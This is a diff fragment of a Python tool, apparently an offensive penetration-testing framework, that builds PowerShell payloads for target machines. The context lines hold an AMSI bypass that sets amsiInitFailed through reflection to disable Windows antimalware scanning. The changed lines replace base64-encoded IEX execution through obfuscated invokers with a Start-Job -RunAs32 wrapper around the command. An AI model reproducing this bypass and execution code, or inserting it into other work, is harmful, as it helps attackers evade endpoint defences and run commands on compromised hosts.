@@ -155,21 +155,26 @@ try{
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
 }catch{}
 """
-
     if force_ps32:
-        command = amsi_bypass + """$command = '{b64_command}'
+        command = amsi_bypass + """
+$functions = {{
+    function Command-ToExecute
+    {{
+{command}
+    }}
+}}
 if ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64')
 {{
-    $exec = $Env:windir + '\\SysWOW64\\WindowsPowerShell\\v1.0\\{ps_invoker}' + $command + '"'
-    IEX $exec
+    $job = Start-Job -InitializationScript $functions -ScriptBlock {{Command-ToExecute}} -RunAs32
+    $job | Wait-Job
 }}
 else
 {{
-    $exec = [System.Convert]::FromBase64String($command)
-    $exec = [Text.Encoding]::Unicode.GetString($exec)
-    IEX $exec
-}}""".format(b64_command=encode_ps_command(amsi_bypass + ps_command),
-             ps_invoker=random.choice(obfs_ps_invokers))
+    IEX "$functions"
+    Command-ToExecute
+}}
+""".format(command=amsi_bypass + ps_command,
+           ps_invoker=obfs_ps_invokers[0])
 
     else:
         command = amsi_bypass + ps_command
